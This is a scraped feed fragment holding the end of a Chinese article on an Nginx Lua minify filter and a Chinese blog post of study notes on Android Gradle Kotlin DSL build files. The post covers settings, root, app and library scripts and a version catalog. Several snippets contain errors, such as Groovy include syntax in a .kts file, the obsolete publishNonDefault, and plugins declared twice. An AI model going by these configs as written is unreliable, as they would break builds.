		       ngx.<span class="hljs-built_in">arg</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(outarr,<span class="hljs-string">""</span>)
	        <span class="hljs-keyword">end</span>
	    <span class="hljs-keyword">else</span>
	      	  ngx.<span class="hljs-built_in">arg</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">""</span>
	    <span class="hljs-keyword">end</span>
	<span class="hljs-keyword">end</span>

</code></pre>
<h2 data-id="heading-0">使用方式</h2>
<p>把以上内容存储到 proxy-data-minify.lua文件中，在宝塔站点配置 Nginx 站点配置文件中加入：</p>
<pre><code class="hljs language-conf" lang="conf">body_filter_by_lua_file /www/server/lua/proxy-data-minify.lua;
</code></pre>
<p>或者统一在 /www/server/nginx/conf/phpinfo.conf 末尾加入上面一行，这样会处理所有php 输出到 网页源码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Gradle 学习 - Kts Gradle学习]]></title>    <link>https://juejin.cn/post/7579298511072346112</link>    <guid>https://juejin.cn/post/7579298511072346112</guid>    <pubDate>2025-12-03T09:57:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579298511072346112" data-draft-id="7578820431039561768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Gradle 学习 - Kts Gradle学习"/> <meta itemprop="keywords" content="前端,gradle"/> <meta itemprop="datePublished" content="2025-12-03T09:57:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明川"/> <meta itemprop="url" content="https://juejin.cn/user/114004941350269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Gradle 学习 - Kts Gradle学习
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/114004941350269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明川
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-03T09:57:32.000Z" title="Wed Dec 03 2025 09:57:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    49
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>  25年主要工作是新App的开发和抽离，期间对Asm和Plugin方面工作较多，理所当然的需要和Gradle打交道，由于项目中使用的Gradle版本较低，且为Groovy版本，所以对Groovy7.0和Kts版本是如何使用的，之前看过但是没有实践过，所以就有了本篇记录文章，算是对25年上半年部分学习知识的总结。 ps：AI当道，虽然很多问题和疑惑直接让Cursor来实现就好了，但是该有的知识库积累还是要做的，好记性不如烂笔头。 可能代码居多，大部分片段都是本地笔记迁移过来的，段落间可能不太连贯 海涵</p>
<h2 data-id="heading-1">Gradle简要介绍</h2>
<p>注释：下边以Gradle kts 为例
简单展示下一般工程的项目结构图</p>
<pre><code class="hljs language-bash" lang="bash">MyAndroidApp/
├── gradle/
│   ├── wrapper/
│   │   ├── gradle-wrapper.jar          <span class="hljs-comment"># 主要是Gradle的运行逻辑，包含下载Gradle</span>
│   │   └── gradle-wrapper.properties   <span class="hljs-comment"># Wrapper 配置，定义了Gradle版本</span>
│   └── libs.versions.toml              <span class="hljs-comment"># 版本目录（Gradle 7.0+）</span>
│
├── app/                                <span class="hljs-comment"># 应用模块</span>
│   ├── build.gradle.kts                <span class="hljs-comment"># 模块构建脚本</span>
│   ├── proguard-rules.pro              <span class="hljs-comment"># ProGuard 规则</span>
│   └── src/                            <span class="hljs-comment"># 源代码</span>
│
├── ktslibrary/                         <span class="hljs-comment"># 库模块（可选）</span>
│   ├── build.gradle.kts
│   └── src/
│
├── buildSrc/                           <span class="hljs-comment"># 自定义构建逻辑（可选）</span>
│   ├── build.gradle.kts
│   └── src/
│
├── build.gradle.kts                    <span class="hljs-comment"># 根项目构建脚本</span>
├── settings.gradle.kts                 <span class="hljs-comment"># 项目设置</span>
├── gradle.properties                   <span class="hljs-comment"># Gradle 属性配置</span>
├── local.properties                    <span class="hljs-comment"># 本地配置（不提交到 Git）</span>
├── gradlew                             <span class="hljs-comment"># Gradle Wrapper 脚本（Unix）</span>
└── gradlew.bat                         <span class="hljs-comment"># Gradle Wrapper 脚本（Windows）</span>
</code></pre>
<h3 data-id="heading-2">gradle-wrapper.properties</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">#Tue Nov <span class="hljs-number">11</span> <span class="hljs-number">20</span>:<span class="hljs-number">22</span>:<span class="hljs-number">16</span> CST <span class="hljs-number">2025</span>
<span class="hljs-comment">//下载的Gradle的压缩包解压后的主目录</span>
distributionBase=GRADLE_USER_HOME   
<span class="hljs-comment">// 相对于distributionBase的解压后的Gradle的路径，为wrapper/dists</span>
distributionPath=wrapper/dists
<span class="hljs-comment">// Gradle版本的下载地址</span>
distributionUrl=https:<span class="hljs-comment">//services.gradle.org/distributions/gradle-8.11.1-bin.zip</span>
<span class="hljs-comment">// 同distributionBase，不过是存放zip压缩包的主目录</span>
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
</code></pre>
<p>和groovy版本变化不大,主要解释都在备注里了</p>
<h3 data-id="heading-3">settings.gradle.kts</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 插件管理配置</span>
pluginManagement {
    <span class="hljs-comment">// 配置插件仓库</span>
    repositories {
        <span class="hljs-comment">// Google 的 Maven 仓库（Android 插件）</span>
        google {
            <span class="hljs-comment">// 内容过滤：只从 Google 下载特定包</span>
            content {
                includeGroupByRegex(<span class="hljs-string">"com\\.android.*"</span>)
                includeGroupByRegex(<span class="hljs-string">"com\\.google.*"</span>)
                includeGroupByRegex(<span class="hljs-string">"androidx.*"</span>)
            }
        }
        
        mavenCentral()  <span class="hljs-comment">// Maven 中央仓库</span>
        gradlePluginPortal()  <span class="hljs-comment">// Gradle 插件门户</span>
    }
    
    <span class="hljs-comment">// 插件版本解析策略</span>
    resolutionStrategy {
        eachPlugin {
            <span class="hljs-comment">// 自定义插件版本解析</span>
            <span class="hljs-keyword">if</span> (requested.id.id == <span class="hljs-string">"com.example.plugin"</span>) {
                useModule(<span class="hljs-string">"com.example:plugin:<span class="hljs-subst">${requested.version}</span>"</span>)
            }
        }
    }
}

<span class="hljs-comment">// 2. 依赖管理配置 三方库引入的源头配置</span>
dependencyResolutionManagement {
    <span class="hljs-comment">// 仓库模式</span>
    <span class="hljs-comment">// FAIL_ON_PROJECT_REPOS: 禁止在项目中声明仓库（推荐）</span>
    <span class="hljs-comment">// PREFER_PROJECT: 优先使用项目中的仓库</span>
    <span class="hljs-comment">// PREFER_SETTINGS: 优先使用 settings 中的仓库</span>
    repositoriesMode.<span class="hljs-keyword">set</span>(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    
    <span class="hljs-comment">// 配置依赖仓库</span>
    repositories {
        google()
        mavenCentral()
        mavenLocal()  <span class="hljs-comment">// 本地 Maven 仓库</span>
        maven { url = uri(<span class="hljs-string">"https://jitpack.io"</span>) }   <span class="hljs-comment">// JitPack（GitHub 项目）</span>
        <span class="hljs-comment">// 阿里云镜像（国内加速）</span>
        maven { url = uri(<span class="hljs-string">"https://maven.aliyun.com/repository/public"</span>) }
        maven { url = uri(<span class="hljs-string">"https://maven.aliyun.com/repository/google"</span>) }
    }
    
    <span class="hljs-comment">// 版本目录</span>
    versionCatalogs {
        <span class="hljs-comment">// 自定义版本目录</span>
        create(<span class="hljs-string">"testLibs"</span>) {
            from(files(<span class="hljs-string">"gradle/test-libs.versions.toml"</span>))
        }
    }
}

<span class="hljs-comment">// 3. 构建缓存配置</span>
buildCache {
    local {
        isEnabled = <span class="hljs-literal">true</span>
        directory = File(rootDir, <span class="hljs-string">"build-cache"</span>)
        removeUnusedEntriesAfterDays = <span class="hljs-number">30</span>
    }
    
    remote&lt;HttpBuildCache&gt; {
        url = uri(<span class="hljs-string">"https://build-cache.example.com/cache/"</span>)
        isEnabled = <span class="hljs-literal">false</span>
        isPush = <span class="hljs-literal">false</span>
    }
}

<span class="hljs-comment">// 4. 插件管理（高级）</span>
plugins {
    <span class="hljs-comment">// 在 settings 中应用插件（Gradle 8.0+）</span>
    id(<span class="hljs-string">"com.gradle.enterprise"</span>) version <span class="hljs-string">"3.15"</span>
}

<span class="hljs-comment">// 5. 项目配置</span>

<span class="hljs-comment">// 设置根项目名称</span>
rootProject.name = <span class="hljs-string">"GradleY"</span>

<span class="hljs-comment">// 包含模块</span>
include <span class="hljs-string">':GroovyLibrary'</span>
include <span class="hljs-string">':KtsLibrary'</span>

<span class="hljs-comment">// 6. Gradle Enterprise / Build Scan</span>
gradleEnterprise {
    buildScan {
        termsOfServiceUrl = <span class="hljs-string">"https://gradle.com/terms-of-service"</span>
        termsOfServiceAgree = <span class="hljs-string">"yes"</span>
        publishAlways()
        <span class="hljs-comment">// 自定义标签</span>
        tag(<span class="hljs-string">"CI"</span>)
        value(<span class="hljs-string">"Git Commit"</span>, getGitCommit())
    }
}

<span class="hljs-comment">// 辅助函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getGitCommit</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> process = Runtime.getRuntime().exec(<span class="hljs-string">"git rev-parse --short HEAD"</span>)
        process.inputStream.bufferedReader().readText().trim()
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-string">"unknown"</span>
    }
}
</code></pre>
<p>  该文件用来配置插件管理，依赖库管理和项目相关配置，具体作用见代码注释中标注</p>
<h3 data-id="heading-4">根项目build.gradle.kts</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build.gradle.kts (root)</span>

<span class="hljs-comment">// 1. 插件声明</span>
plugins {
    <span class="hljs-comment">// 使用版本目录（推荐）</span>
    alias(libs.plugins.android.application) apply <span class="hljs-literal">false</span>
    alias(libs.plugins.android.library) apply <span class="hljs-literal">false</span>
    alias(libs.plugins.kotlin.android) apply <span class="hljs-literal">false</span>
    alias(libs.plugins.kotlin.jvm) apply <span class="hljs-literal">false</span>
    
    <span class="hljs-comment">// 或直接声明版本</span>
    id(<span class="hljs-string">"com.android.application"</span>) version <span class="hljs-string">"8.1.0"</span> apply <span class="hljs-literal">false</span>
    id(<span class="hljs-string">"org.jetbrains.kotlin.android"</span>) version <span class="hljs-string">"1.9.0"</span> apply <span class="hljs-literal">false</span>
    
    <span class="hljs-comment">// apply false 的含义：</span>
    <span class="hljs-comment">// 声明版本但不应用到根项目，由子项目自己决定是否应用</span>
}

<span class="hljs-comment">// 为所有项目配置</span>
allprojects {
    <span class="hljs-comment">// 设置项目属性</span>
    group = <span class="hljs-string">"com.example"</span>
    version = <span class="hljs-string">"1.0.0"</span>
    
    <span class="hljs-comment">// 配置任务</span>
    tasks.withType&lt;JavaCompile&gt;().configureEach {
        options.encoding = <span class="hljs-string">"UTF-8"</span>
    }
}

<span class="hljs-comment">// 为所有子项目配置</span>
subprojects {
    <span class="hljs-comment">// 应用通用插件</span>
    apply(plugin = <span class="hljs-string">"checkstyle"</span>)
    
    <span class="hljs-comment">// 配置通用依赖</span>
    dependencies {
        <span class="hljs-comment">// 所有子项目都添加这个依赖</span>
        <span class="hljs-string">"implementation"</span>(<span class="hljs-string">"org.jetbrains.kotlin:kotlin-stdlib"</span>)
    }
   
}
</code></pre>
<p>   <strong>alias(libs.plugins.android.application) apply false</strong> ，kotlin 挺好的一点就是可进行定义跳转，alias后边这里的 定义在 <strong>libs.versions.toml</strong>文件中，apply false表示不应用到跟项目，子项目可以使用。</p>
<p>  这里还需要注意的是<strong>allprojects</strong> 是包含整个项目的配置， <strong>subprojects</strong> 不包含跟项目，只包含子项目。</p>
<h3 data-id="heading-5">app build.gradle.kts</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-comment">// 1. 插件配置</span>
plugins {
    <span class="hljs-comment">// 应用插件</span>
    alias(libs.plugins.android.application)
    alias(libs.plugins.kotlin.android)
    alias(libs.plugins.kotlin.kapt)  <span class="hljs-comment">// Kotlin 注解处理</span>
    
    <span class="hljs-comment">// 或直接声明</span>
    id(<span class="hljs-string">"com.android.application"</span>)
    id(<span class="hljs-string">"org.jetbrains.kotlin.android"</span>)
    kotlin(<span class="hljs-string">"kapt"</span>)  <span class="hljs-comment">// 等同于 id("org.jetbrains.kotlin.kapt")</span>
}

<span class="hljs-comment">// 2. Android 基本配置</span>
android {
    <span class="hljs-comment">// 命名空间（AGP 7.0+，替代 manifest 中的 package）</span>
    namespace = <span class="hljs-string">"com.example.app"</span>
    <span class="hljs-comment">// 编译 SDK 版本</span>
    compileSdk = <span class="hljs-number">33</span>
    <span class="hljs-comment">// 构建工具版本（可选，默认使用 AGP 推荐版本）</span>
    buildToolsVersion = <span class="hljs-string">"33.0.1"</span>
    
    <span class="hljs-comment">// 默认配置</span>
    defaultConfig {
        applicationId = <span class="hljs-string">"com.example.app"</span>  <span class="hljs-comment">// 应用 ID</span>
        minSdk = <span class="hljs-number">24</span>
        targetSdk = <span class="hljs-number">33</span>
        versionCode = <span class="hljs-number">1</span>    <span class="hljs-comment">// 版本号</span>
        versionName = <span class="hljs-string">"1.0.0"</span>
        
        <span class="hljs-comment">// 测试运行器</span>
        testInstrumentationRunner = <span class="hljs-string">"androidx.test.runner.AndroidJUnitRunner"</span>
        
        <span class="hljs-comment">// BuildConfig 字段</span>
        buildConfigField(<span class="hljs-string">"String"</span>, <span class="hljs-string">"API_BASE_URL"</span>, <span class="hljs-string">"\"https://api.example.com\""</span>)
        buildConfigField(<span class="hljs-string">"boolean"</span>, <span class="hljs-string">"ENABLE_LOGGING"</span>, <span class="hljs-string">"true"</span>)
        buildConfigField(<span class="hljs-string">"int"</span>, <span class="hljs-string">"MAX_RETRY_COUNT"</span>, <span class="hljs-string">"3"</span>)
        
        <span class="hljs-comment">// Vector Drawable 支持</span>
        vectorDrawables {
            useSupportLibrary = <span class="hljs-literal">true</span>
        }
        
        ndk {
            <span class="hljs-comment">// NDK 配置 支持的 ABI</span>
            abiFilters += setOf(<span class="hljs-string">"armeabi-v7a"</span>, <span class="hljs-string">"arm64-v8a"</span>)
        }
        
        multiDexEnabled = <span class="hljs-literal">true</span>  <span class="hljs-comment">// 多 Dex 支持</span>
        consumerProguardFiles(<span class="hljs-string">"consumer-rules.pro"</span>)   <span class="hljs-comment">// ProGuard 消费者规则</span>
    }
    
    <span class="hljs-comment">// 签名配置</span>
    signingConfigs {
        getByName(<span class="hljs-string">"debug"</span>) {        <span class="hljs-comment">// Debug 签名</span>
            storeFile = file(<span class="hljs-string">"debug.keystore"</span>)
            storePassword = <span class="hljs-string">"android"</span>
            keyAlias = <span class="hljs-string">"androiddebugkey"</span>
            keyPassword = <span class="hljs-string">"android"</span>
        }

        create(<span class="hljs-string">"release"</span>) {        <span class="hljs-comment">// Release 签名</span>
            <span class="hljs-comment">// 从 local.properties 读取</span>
            <span class="hljs-keyword">val</span> keystoreProperties = File(rootDir, <span class="hljs-string">"keystore.properties"</span>)
            <span class="hljs-keyword">if</span> (keystoreProperties.exists()) {
                <span class="hljs-keyword">val</span> properties = java.util.Properties()
                properties.load(keystoreProperties.inputStream())
                
                storeFile = file(properties[<span class="hljs-string">"storeFile"</span>] <span class="hljs-keyword">as</span> String)
                storePassword = properties[<span class="hljs-string">"storePassword"</span>] <span class="hljs-keyword">as</span> String
                keyAlias = properties[<span class="hljs-string">"keyAlias"</span>] <span class="hljs-keyword">as</span> String
                keyPassword = properties[<span class="hljs-string">"keyPassword"</span>] <span class="hljs-keyword">as</span> String
            }
        }
    }
    
    <span class="hljs-comment">// 构建类型</span>
    buildTypes {
        <span class="hljs-comment">// Debug 类型</span>
        debug {
            applicationIdSuffix = <span class="hljs-string">".debug"</span>
            versionNameSuffix = <span class="hljs-string">"-debug"</span>
            
            isDebuggable = <span class="hljs-literal">true</span>
            isMinifyEnabled = <span class="hljs-literal">false</span>
            isShrinkResources = <span class="hljs-literal">false</span>
            
            buildConfigField(<span class="hljs-string">"String"</span>, <span class="hljs-string">"API_BASE_URL"</span>, <span class="hljs-string">"\"https://dev-api.example.com\""</span>)
            resValue(<span class="hljs-string">"string"</span>, <span class="hljs-string">"app_name"</span>, <span class="hljs-string">"MyApp Debug"</span>)
            
            signingConfig = signingConfigs.getByName(<span class="hljs-string">"debug"</span>)
        }
        
        <span class="hljs-comment">// Release 类型</span>
        release {
            isDebuggable = <span class="hljs-literal">false</span>
            isMinifyEnabled = <span class="hljs-literal">true</span>
            isShrinkResources = <span class="hljs-literal">true</span>
            
            proguardFiles(
                getDefaultProguardFile(<span class="hljs-string">"proguard-android-optimize.txt"</span>),
                <span class="hljs-string">"proguard-rules.pro"</span>
            )
            
            signingConfig = signingConfigs.getByName(<span class="hljs-string">"release"</span>)
            
            buildConfigField(<span class="hljs-string">"String"</span>, <span class="hljs-string">"API_BASE_URL"</span>, <span class="hljs-string">"\"https://api.example.com\""</span>)
            resValue(<span class="hljs-string">"string"</span>, <span class="hljs-string">"app_name"</span>, <span class="hljs-string">"MyApp"</span>)
        }
    }
    
    <span class="hljs-comment">// 编译选项</span>
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
        
        <span class="hljs-comment">// 启用 desugaring</span>
        isCoreLibraryDesugaringEnabled = <span class="hljs-literal">true</span>
    }
    
    kotlinOptions {
        jvmTarget = <span class="hljs-string">"11"</span>
        
        <span class="hljs-comment">// Kotlin 编译器参数</span>
        freeCompilerArgs = listOf(
            <span class="hljs-string">"-opt-in=kotlin.RequiresOptIn"</span>,
            <span class="hljs-string">"-Xjvm-default=all"</span>,
            <span class="hljs-string">"-Xcontext-receivers"</span>
        )
    }
    
    <span class="hljs-comment">// 构建特性</span>
    buildFeatures {
        viewBinding = <span class="hljs-literal">true</span>         <span class="hljs-comment">// ViewBinding</span>
        dataBinding = <span class="hljs-literal">false</span>        <span class="hljs-comment">// DataBinding</span>
        compose = <span class="hljs-literal">false</span>           <span class="hljs-comment">// Compose</span>
        buildConfig = <span class="hljs-literal">true</span>        <span class="hljs-comment">// BuildConfig</span>
        aidl = <span class="hljs-literal">false</span>             <span class="hljs-comment">// AIDL</span>
        renderScript = <span class="hljs-literal">false</span>      <span class="hljs-comment">// RenderScript</span>
        shaders = <span class="hljs-literal">false</span>          <span class="hljs-comment">// Shaders</span>
    }
    
    <span class="hljs-comment">// Compose 配置（如果启用）</span>
    composeOptions {
        kotlinCompilerExtensionVersion = <span class="hljs-string">"1.5.3"</span>
    }
}

<span class="hljs-comment">// 3. 依赖配置</span>
dependencies {
    <span class="hljs-comment">// Core</span>
    implementation(libs.androidx.core.ktx)
    implementation(libs.androidx.appcompat)
    implementation(libs.material)
    
    <span class="hljs-comment">// Kotlin</span>
    implementation(libs.kotlin.stdlib)
    implementation(libs.kotlinx.coroutines.core)
    implementation(libs.kotlinx.coroutines.android)
    
    <span class="hljs-comment">// Android Components</span>
    implementation(libs.androidx.activity.ktx)
    implementation(libs.androidx.fragment.ktx)
    implementation(libs.androidx.lifecycle.runtime.ktx)
    implementation(libs.androidx.lifecycle.viewmodel.ktx)
    
    ...
}
</code></pre>
<p>  主要声明App bundle中使用到的依赖，构建信息设置和应用插件等信息</p>
<h3 data-id="heading-6">library build.gradle.kts</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">plugins {
    alias(libs.plugins.android.library)  <span class="hljs-comment">// 注意是 library 不是 application</span>
    alias(libs.plugins.kotlin.android)
}

android {
    namespace = <span class="hljs-string">"com.example.library"</span>
    compileSdk = <span class="hljs-number">33</span>
    
    defaultConfig {
        minSdk = <span class="hljs-number">24</span>
        <span class="hljs-comment">// library 没有 applicationId 和 versionCode/versionName</span>
        testInstrumentationRunner = <span class="hljs-string">"androidx.test.runner.AndroidJUnitRunner"</span>
        
        <span class="hljs-comment">// 消费者 ProGuard 规则</span>
        consumerProguardFiles(<span class="hljs-string">"consumer-rules.pro"</span>)
    }
    
    buildTypes {
        release {
            isMinifyEnabled = <span class="hljs-literal">false</span>
            proguardFiles(
                getDefaultProguardFile(<span class="hljs-string">"proguard-android-optimize.txt"</span>),
                <span class="hljs-string">"proguard-rules.pro"</span>
            )
        }
    }
    
    <span class="hljs-comment">// library 可以发布不同的变体</span>
    publishNonDefault = <span class="hljs-literal">true</span>
}

dependencies {
    <span class="hljs-comment">// api: 透传依赖 给使用此库的模块</span>
    api(libs.kotlin.stdlib)
    
    <span class="hljs-comment">// implementation: 不透传 仅当前模块依赖</span>
    implementation(libs.androidx.core.ktx)
    testImplementation(libs.junit)
}
</code></pre>
<h3 data-id="heading-7">gradle libs.versions.toml</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[versions]</span>
<span class="hljs-attr">agp</span> = <span class="hljs-string">"8.10.0"</span>
<span class="hljs-attr">kotlin</span> = <span class="hljs-string">"2.0.21"</span>
<span class="hljs-attr">coreKtx</span> = <span class="hljs-string">"1.17.0"</span>
<span class="hljs-attr">junit</span> = <span class="hljs-string">"4.14-SNAPSHOT"</span>
<span class="hljs-attr">junitVersion</span> = <span class="hljs-string">"1.3.0"</span>
<span class="hljs-attr">espressoCore</span> = <span class="hljs-string">"3.7.0"</span>
<span class="hljs-attr">lifecycleRuntimeKtx</span> = <span class="hljs-string">"2.9.4"</span>
<span class="hljs-attr">activityCompose</span> = <span class="hljs-string">"1.11.0"</span>
<span class="hljs-attr">composeBom</span> = <span class="hljs-string">"2024.09.00"</span>
<span class="hljs-attr">appcompat</span> = <span class="hljs-string">"1.7.1"</span>
<span class="hljs-attr">material</span> = <span class="hljs-string">"1.13.0"</span>

<span class="hljs-section">[libraries]</span>
<span class="hljs-attr">androidx-core-ktx</span> = { group = <span class="hljs-string">"androidx.core"</span>, name = <span class="hljs-string">"core-ktx"</span>, version.ref = <span class="hljs-string">"coreKtx"</span> }
<span class="hljs-attr">junit</span> = { group = <span class="hljs-string">"junit"</span>, name = <span class="hljs-string">"junit"</span>, version.ref = <span class="hljs-string">"junit"</span> }
<span class="hljs-attr">androidx-junit</span> = { group = <span class="hljs-string">"androidx.test.ext"</span>, name = <span class="hljs-string">"junit"</span>, version.ref = <span class="hljs-string">"junitVersion"</span> }
<span class="hljs-attr">androidx-espresso-core</span> = { group = <span class="hljs-string">"androidx.test.espresso"</span>, name = <span class="hljs-string">"espresso-core"</span>, version.ref = <span class="hljs-string">"espressoCore"</span> }
<span class="hljs-attr">androidx-lifecycle-runtime-ktx</span> = { group = <span class="hljs-string">"androidx.lifecycle"</span>, name = <span class="hljs-string">"lifecycle-runtime-ktx"</span>, version.ref = <span class="hljs-string">"lifecycleRuntimeKtx"</span> }
<span class="hljs-attr">androidx-activity-compose</span> = { group = <span class="hljs-string">"androidx.activity"</span>, name = <span class="hljs-string">"activity-compose"</span>, version.ref = <span class="hljs-string">"activityCompose"</span> }
<span class="hljs-attr">androidx-compose-bom</span> = { group = <span class="hljs-string">"androidx.compose"</span>, name = <span class="hljs-string">"compose-bom"</span>, version.ref = <span class="hljs-string">"composeBom"</span> }
<span class="hljs-attr">androidx-ui</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui"</span> }
<span class="hljs-attr">androidx-ui-graphics</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui-graphics"</span> }
<span class="hljs-attr">androidx-ui-tooling</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui-tooling"</span> }
